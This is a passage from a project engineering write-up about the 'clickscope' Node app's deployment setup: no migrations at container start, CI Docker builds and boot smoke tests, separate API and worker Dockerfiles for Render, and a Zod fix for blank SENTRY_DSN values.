built images' `node_modules` **do not contain node-pg-migrate at all**,
so `npm run migrate:up` isn't just discouraged inside these containers,
it's impossible to run. That's a deliberate consequence of the
prod/dev dependency split, not an accident this phase is working around.
Conceptually, even if migrations *could* run on boot: a typical
zero-downtime deploy starts new container replicas before (or
concurrently with) stopping old ones, and some deploy strategies run
more than one replica of the API at a time. If every replica tried to
run migrations against a shared database on startup, two replicas
starting within the same window would race to apply the same migration
—`node-pg-migrate` isn't designed to have multiple concurrent runners
racing against the same `pgmigrations` tracking table, and the failure
mode ranges from a harmless duplicate-migration error (if the migration
is naturally idempotent or errors cleanly on re-application) to a
genuinely corrupted migration history or a half-applied schema change if
two runners interleave mid-migration.

**How it works mechanically.** For local image validation via
`docker-compose.prod.yml`, the compose file's own header comment
documents the correct sequence: bring up `postgres`/`redis` (and
`api`/`worker`, which will run fine against whatever schema currently
exists, since neither depends on a specific migration state to *start*
— only individual routes/jobs would fail against a stale schema), then
run `npm run migrate:up` from the host, pointed at the compose Postgres's
mapped port. In a real deployment (Phase 15c), the equivalent will be a
platform-provided "pre-deploy command" or "release phase" hook — a
single, one-shot step the platform runs once per deploy, before new
application containers start receiving traffic, decoupled from the
application containers' own lifecycle entirely.

**Where it lives in the codebase.** `docker-compose.prod.yml`'s header
comment (documents the sequence for local validation);
`package.json`'s `devDependencies`/`dependencies` split (the structural
enforcement); this section and Phase 15c (not yet written) for the real
deploy wiring.

**Common pitfalls.** The tempting shortcut is to add a migration step
to the container's `CMD` (e.g. `sh -c "npm run migrate:up && node
dist/server.js"`) so "the container just works" without a separate
deploy step to configure. This is exactly the concurrent-replica race
described above waiting to happen the first time more than one replica
starts around the same time — and in this repo, it isn't even available
as a shortcut, since `node-pg-migrate` isn't in the runtime image at
all.

**Production considerations.** A real pre-deploy/release-phase hook
(Phase 15c) runs migrations exactly once per deploy, before any new
replica starts serving traffic, with the platform itself responsible for
not starting application containers until that step succeeds — this is
the mechanism that makes migrations safe under concurrent-replica
deploys, not anything in this phase's Dockerfile or compose file.

**Interview answer.** Migrations never run as part of a container's
startup command here — partly because it's a genuine correctness risk
(two replicas racing to migrate the same database concurrently can
corrupt the migration history), and partly because the runtime image
structurally can't do it anyway: `node-pg-migrate` is a devDependency,
so it's absent from the `npm ci --omit=dev` production `node_modules`.
Migrations are a separate, one-shot step — run by hand against a local
compose stack in this phase, and via a platform pre-deploy hook once
real deployment is wired up.

### Why the Docker build itself is verified in CI, not just `npm run build`

**What it is.** `.github/workflows/ci.yml` has a second job,
`docker-build`, that actually runs `docker build -f Dockerfile.api` and
`docker build -f Dockerfile.worker` — separate from, and not a substitute
for, the `test` job's `npm run typecheck`/`npm test`.

**Why it exists in this project.** Two concrete gaps a passing
`npm run build` wouldn't catch. First: the `test` job's `npm ci`
installs the *full* dependency tree (prod + dev), but `runtime-base`'s
`npm ci --omit=dev` is a genuinely different dependency resolution — a
package that only "works" because some devDependency happens to shadow
or polyfill something it needs would pass every check in the `test` job
and still fail (or misbehave) in the actual shipped image. Second, and
more concrete to this repo: the root `tsconfig.json`'s `include` is
`src/**/*.ts` only (`worker/` is explicitly excluded from the project
`npm run typecheck` compiles) — so `npm run typecheck` **never
type-checks a single file under `worker/` at all**. The `build-worker`
Dockerfile stage's own `tsc -p worker/tsconfig.json` invocation is the
only thing in this entire CI pipeline that type-checks the worker
process's code.

**How it works mechanically.** `docker-build` runs on a fresh checkout,
independent of the `test` job (no `needs:`, so both run in parallel —
building doesn't depend on database/migration state, only on the repo
being checked out; the `services:` Postgres/Redis this job *does*
declare exist purely for the boot-smoke-test steps below, not for the
build itself — see the next section). It builds both files and runs
`docker images clickscope-api:ci` and `docker images clickscope-worker:ci`
as two separate steps (not one `docker images repo1 repo2` call — this
Docker CLI version rejects more than one repository argument, confirmed
while validating this phase), printing each image's size to the job log
as a lightweight size-regression signal.

**Where it lives in the codebase.** `.github/workflows/ci.yml`,
`docker-build` job.

**Common pitfalls.** Treating `docker build` as "just packaging" and
gating CI on `npm run build` alone would silently leave `worker/`
completely untype-checked in this repo's specific tsconfig layout — a
type error introduced in `worker/index.ts` or any file under `worker/`
would pass every other CI step and only surface at runtime, or not at
all if the code path isn't exercised by a test.

**Production considerations.** Building both images on every PR also
means image-build failures (a missing file in a `COPY`, a stage
referencing the wrong build output) are caught before merge, not
discovered during an actual deploy attempt — cheaper and faster to fix
in a PR than in a failed production rollout.

**Interview answer.** `npm run build` and `docker build` aren't
redundant checks here — they verify different things. The Docker build
job catches two gaps the plain build/test job can't: it resolves
dependencies the way the shipped image actually will
(`npm ci --omit=dev`, not the full dev tree), and — because this repo's
root `tsconfig.json` excludes `worker/` from `npm run typecheck` — the
worker's own `tsc` invocation inside the Dockerfile is the only place in
CI that type-checks the worker process at all.

### The boot-smoke test: `docker build` succeeding still isn't enough

**What it is.** Two more steps in the `docker-build` job, after both
images are built: one starts the `api` image and polls `GET /health`
until it returns `200` or `503` (a hard timeout otherwise fails the
job), the other starts the `worker` image and confirms it's still
running and has logged its ready message a few seconds later.

**Why it exists in this project.** `docker build` only proves an image
*compiles and assembles* — it never runs the container, so it structurally
cannot catch a boot-time crash. Both real bugs this phase turned up
(the missing `COPY openapi.json` and `SENTRY_DSN=""`, see "Empty string
vs. absent" below) were exactly that shape: the image built successfully
every time, and only crashed once actually started. Without this step,
either bug would have sailed through CI green and only surfaced during
an actual deploy.

**How it works mechanically.** `--network host` puts the smoke-test
container in the GitHub Actions runner's own network namespace, so
`localhost:5432`/`localhost:6379` (the job's own `services:` Postgres/
Redis, published on the runner's localhost the same way the `test`
job's are) are directly reachable from inside it — a container on the
default bridge network can't see the runner's published service ports
any other way, since bridge networking gives the container its own
loopback, separate from the runner's. The api container runs with
`--env-file .env.prod.example` (reusing the same file that validates
`docker-compose.prod.yml` locally — one source of truth, re-validated
against the schema on every CI run) plus `-e` overrides pointing
`DATABASE_URL`/`REDIS_URL` at the service containers instead of
compose's `postgres`/`redis` hostnames. A bash loop polls `/health`
once a second for up to 30s, accepting `200` or `503` as success (both
prove the container is up and serving HTTP; only silence or a crash
fails the job) and dumping `docker logs` on timeout for diagnosis. The
worker check is a liveness check, not an HTTP one — it has no endpoint
— so it asserts `docker inspect -f '{{.State.Running}}'` is still `true`
five seconds in, and greps its logs for the same `"clickscope-worker
ready"` line `worker/index.ts` already logs on a real successful boot.

Real, reachable Redis matters here for a reason beyond realism, found
while building this step: `src/queues/connection.ts`'s BullMQ queue
connection sets `maxRetriesPerRequest: null` (a hard BullMQ requirement
for `Worker`, applied to this `Queue` connection too, for one consistent
mental model — see that file's own comment). `getHealthReport()`
(`src/services/health.ts`) calls `checkQueueDepth()`, which issues a
command against that same connection. With `maxRetriesPerRequest: null`,
a command issued while the connection can't be established doesn't fail
after some bounded number of retries — it queues forever, since that's
precisely the "give up" behavior this setting disables. Confirmed
directly: pointing this smoke test at Postgres/Redis URLs with nothing
actually listening made `/health` never respond at all, not even
eventually — `Promise.all` in `getHealthReport()` never resolves, so the
request hangs indefinitely rather than returning `503`. A smoke test
built against placeholder, unreachable URLs wouldn't just be less
realistic — it would be permanently broken, timing out on every single
run regardless of whether the image itself was fine. This is also a
real latent gap in the app's own readiness probe, independent of this
CI step: if Redis genuinely goes down in production, `/health` may hang
indefinitely instead of reporting `503` promptly. Out of scope to fix as
part of a CI smoke test — noted here as a discovered risk, not a bug
this phase fixes.

**Where it lives in the codebase.** `.github/workflows/ci.yml`,
`docker-build` job, the "Boot-smoke test the api image" and "Boot-smoke
test the worker image" steps (plus their `if: always()` cleanup steps
immediately after each).

**Common pitfalls.** Docker Desktop's `--network host` (macOS/Windows)
is scoped to its internal Linux VM, not literally the host machine — a
`curl` run directly in a Mac terminal cannot reach a `--network host`
container's ports, only another process *inside* that same VM namespace
can (confirmed directly while validating this step: `docker run --rm
--network host curlimages/curl ...` reached the smoke-tested container
and got the expected `503`; a bare Mac-terminal `curl` to the same URL
got connection-refused). This is a Docker-Desktop-specific quirk with no
bearing on GitHub Actions' Linux runners, where the runner's own shell
*is* the host network namespace and a plain `curl` step reaches a
`--network host` container directly — but it means this exact step
can't be validated identically on a Mac; local validation instead used
the compose network with published ports, which exercises the same
retry-loop and pass/fail logic without depending on host networking. A
second, smaller pitfall caught while testing: `curl -w '%{http_code}'
... || echo 000` is redundant and produces doubled output (`000000`) on
a connection failure — curl already writes `000` via `-w` when no
response is received, but still exits non-zero, so the `||` fires *in
addition to* curl's own correct output. Dropped the `|| echo 000`
entirely once this was confirmed.

**Production considerations.** This step validates boot correctness,
not full production behavior — `NODE_ENV=production` (from
`.env.prod.example`) means the database check will always report
`error` here, since this job's throwaway Postgres service, like the
local `docker-compose.prod.yml` validation, has no SSL listener (see
"Empty string vs. absent" below and `src/db/pool.ts`'s SSL requirement).
A `503` with `database: error` is the expected, passing outcome, not a
failure — what this step actually proves is that the container starts
and serves an HTTP response within a bounded window, which is exactly
the class of bug (a crash before the server ever binds its port) that
neither `docker build` nor the `test` job's `npm test` can see.

**Interview answer.** `docker build` proves an image assembles
correctly; it says nothing about whether the process inside it actually
starts. Both real bugs this project hit while building its Docker
pipeline — a runtime-read file missing from a `COPY`, and an env var
that crashed startup — were boot-time failures a passing `docker build`
would never catch. The smoke test closes that gap by actually running
each image and checking for a live signal (an HTTP response for the
API, a log line plus liveness for the worker) within a timeout. Getting
this right required understanding a downstream detail I hadn't
otherwise had a reason to look at: one dependency's queue connection
disables its own request-retry limit, so pointing the smoke test at
fake, unreachable infrastructure wouldn't have "mostly worked" — it
would have hung on every run, because that specific connection is
designed to wait forever rather than fail fast.

### One repo, two deployable images

**What it is.** Two files, `Dockerfile.api` and `Dockerfile.worker`, each
a self-contained multi-stage build (`deps` → its own build stage →
`runtime-base` → a final unnamed stage), producing two
independently-taggable, independently-deployable images from a single npm
package with one shared `node_modules` tree. `docker build -f
Dockerfile.api -t clickscope-api .` and `docker build -f Dockerfile.worker
-t clickscope-worker .` each build only their own file's default (last)
stage — no `--target` flag involved.

**Why it exists in this project.** CLAUDE.md already frames the worker as
"a separate process, separate deploy." The API and worker are 100%
dependency-identical (no separate `worker/package.json` exists — see the
original Phase 15a exploration that confirmed this) and differ only in
which `tsc` project compiles (`tsconfig.json` vs. `worker/tsconfig.json`)
and which compiled entry file runs (`dist/server.js` vs.
`dist/worker/index.js`).

**How it works mechanically.** Each file independently runs `deps` (`npm
ci`), its own build stage (`build-api` copies `tsconfig.json` + `src/`;
`build-worker` copies `tsconfig.json` + `src/` + `worker/`, since
`worker/tsconfig.json` extends the root config and imports two `src/`
files directly), then a fresh `runtime-base` (`node:24-alpine`, a second
independent `npm ci --omit=dev` against the same lockfile, `USER node`),
then a final stage that `COPY --from=` only the compiled `dist/` output
from its own build stage. Because the two files share no build context
across each other, `docker build -f Dockerfile.api ...` never needs to
compile worker source at all, and vice versa.

**Where it lives in the codebase.** `Dockerfile.api`, `Dockerfile.worker`
(repo root); `.github/workflows/ci.yml`'s `docker-build` job (builds each
file explicitly by path via `-f`); `docker-compose.prod.yml` (each of the
`api`/`worker` services points `build.dockerfile` at its respective
file).

**Common pitfalls.** The two files now duplicate everything that isn't
target-specific — the base image tag, the `npm ci` / `npm ci --omit=dev`
invocations, the `USER node` line — so a future change (a Node version
bump, a new non-root-user requirement) has to be made in both files by
hand, with no compiler or test to catch a missed one. This is a real,
accepted cost, not an oversight (see the addendum below for why it's
accepted).

**Production considerations.** Deploy independence comes from tagging and
deploying the two *images* separately (a worker rollout doesn't have to
redeploy the API, and vice versa) — that was true under the single-file
`--target` approach and remains true here; splitting the build recipes
into two files doesn't change deploy independence one way or the other.

**Addendum: why this reversed from one file to two.** This section
originally argued for a single `Dockerfile` with two named targets
(`docker build --target api` / `--target worker`) specifically to avoid
this duplication — and rejected a two-file split as "no real gain in
deploy independence." That reasoning assumed the deploy target could pass
a `--target` flag at build time. Render's dashboard-driven Docker builds
cannot: there is no field in the Render UI to select a build stage from a
multi-stage Dockerfile, and this is a confirmed, currently open, unresolved
feature request on Render's own community forum — not a hypothetical
limitation. Since Render is this project's actual deploy target, the
single-file approach isn't just suboptimal here, it's unusable: Render
would build the file's *last* stage (`worker`, in the original ordering)
for both services, with no way to make it build `api` for one of them.
Splitting into two files works around this because each file's implicit
default final stage IS the image Render needs — the fix is entirely about
what the deploy target can select at build time, not a change in opinion
about DRY-ness. The duplication cost flagged above is accepted because
there's no alternative that both satisfies Render's constraint and keeps
one shared file.

**Interview answer.** This project briefly had one Dockerfile with two
named build targets, on the theory that shared setup (base image, `npm
ci`, non-root user) should live in exactly one place. That broke against
a real deploy-platform constraint: Render's dashboard builds a Dockerfile
as-is and has no way to pass `--target`, so a single multi-stage file
can't produce two different final images there — it was actually
architecture picked without checking what the deploy platform could do
with it. The fix was a mechanical split into `Dockerfile.api` and
`Dockerfile.worker`, each self-contained with the same stage structure,
non-root user, and layer-caching order as before. The tradeoff is real —
shared setup now lives in two files and has to be updated in both — but
it's the only option that actually works with Render's build model.

### Empty string vs. absent: the `--env-file` trap

**What it is.** `src/config/env.ts`'s `SENTRY_DSN` field now runs a
`z.preprocess()` step that converts an empty-string value to `undefined`
before Zod's own `.optional()`/`.url()` checks ever see it — found and
fixed while validating `docker-compose.prod.yml` in this phase, when a
`SENTRY_DSN=` line (deliberately left blank, matching `.env.example`'s
own pattern for "disable Sentry") crashed both the `api` and `worker`
containers on boot with `SENTRY_DSN must be a valid URL`.

**Why it exists in this project.** `.optional()` only treats a
genuinely *absent* key — no `SENTRY_DSN` property in the parsed object
at all — as unset. An empty string is a **present** value as far as Zod
is concerned, so `z.string().url().optional()` still runs `.url()`
against `""` and rejects it. That distinction wouldn't matter if a blank
line in an env file actually produced an absent key, but it doesn't:
both Node's `--env-file` flag and Docker Compose's `env_file:` directive
parse a bare `KEY=` line as `process.env.KEY = ""`, not as `KEY` being
left out of `process.env` entirely. Confirmed directly:
`node --env-file=/tmp/testenv -e "console.log(JSON.stringify(process.env.FOO))"`
against a file containing `FOO=` prints `""`, not `undefined`. This
means every optional env var in this app was always one blank-but-present
line away from failing validation it was specifically designed to pass —
`SENTRY_DSN` just happened to be the first one anyone actually left
blank against a code path (a fresh container boot) that surfaced it
loudly instead of silently.

**How it works mechanically.** `z.preprocess((value) => (value === ''
? undefined : value), innerSchema)` runs its function against the raw
input *before* `innerSchema` (here, `z.string().url(...).optional()`)
ever validates it. An empty string is rewritten to `undefined`
up front, so `.optional()` sees exactly what it was always designed to
handle — an absent value — and the `.url()` check never runs against it
at all. A non-empty string still flows through unchanged and still has
to pass `.url()`. This is different from `.or(z.literal(''))`, which
would have made `""` a *valid distinct output value* alongside a real
URL, rather than normalizing it away — the task here is "treat blank
the same as absent," not "also accept blank as its own valid state."

**Where it lives in the codebase.** `src/config/env.ts` (the
`SENTRY_DSN` field); `tests/config/env.test.ts`'s `describe('SENTRY_DSN'
...)` block (asserts `SENTRY_DSN: ''` parses identically to `SENTRY_DSN`
omitted, alongside the existing valid-DSN and rejected-non-URL cases).
Because `worker/config.ts` builds its own schema via
`envSchema.pick({ ..., SENTRY_DSN: true, ... })`, this one fix covers
both the API and the worker — there's no second copy of this field to
patch.

**Common pitfalls, and the generic-helper question.** The natural
follow-up question: should every optional field in this schema get the
same `emptyStringAsUndefined()` treatment, via a small reusable helper,
rather than fixing `SENTRY_DSN` as a one-off? Decided against it here,
for a concrete reason rather than just "keep it simple": `SENTRY_DSN` is
currently the **only** field in `envSchema` using bare `.optional()` —
every other field that has a fallback uses `.default(...)` instead
(`NODE_ENV`, `PORT`, `LOG_LEVEL`, `JWT_EXPIRES_IN`, `BCRYPT_COST`,
`TRUST_PROXY`, every `RATE_LIMIT_*` var). A generic helper would have
exactly one real call site today — introducing an abstraction for a
problem with one instance is exactly the kind of speculative generality
this project's conventions call out to avoid. It's also not a drop-in
fix for the `.default()` fields even if it were generalized: those
fields' relationship with an empty string is a *different* bug shape,
not the same one. `z.coerce.number().default(3000)` given `PORT=""`
doesn't skip to the default at all — `.default()` only activates on
`undefined`, and `Number('')` coerces to `0`, not `NaN` or "missing," so
`PORT=""` currently fails `.positive()` with a real but differently-worded
error, never silently falls back to 3000. Papering over that with the
same `emptyStringAsUndefined()` helper would be a second, separate fix
disguised as reusing the first one. If a second genuinely-`.optional()`
field (no default, format-validated) gets added later, revisit this as
a two-instance pattern worth a helper then — not before.

**Production considerations.** This is exactly the kind of bug that
only shows up in exactly the environment least likely to be interactively
debugged — a container failing health checks in CI or a fresh deploy,
not a developer's terminal where `.env` was hand-edited and SENTRY_DSN
was probably either filled in or the line deleted outright rather than
left blank. Catching it here, while validating `docker-compose.prod.yml`
locally rather than during a real deploy, is the entire point of Phase
15a's "prove the images actually run" step — this bug would have looked
identical in a real Render deploy log.

**Interview answer.** `.optional()` in Zod (and most schema libraries)
means "absent is fine," not "falsy is fine" — an empty string is a
value, not a missing one, and format validators like `.url()` correctly
reject it. The trap is that `--env-file`/`env_file:` parsing of a
blank-but-present `KEY=` line produces exactly that: a present empty
string, not an absent key, so a field that looks optional in the schema
can still reject the exact "leave it blank to disable" input the schema
was written to accept. `z.preprocess()` fixes it by normalizing `""` to
`undefined` before the rest of the schema runs, restoring the semantics
`.optional()` was supposed to have. I fixed it narrowly for the one
field that actually has this shape today rather than generalizing to a
helper — the other "defaultable" fields in this schema have a different,
unrelated empty-string interaction that the same helper wouldn't
actually solve.
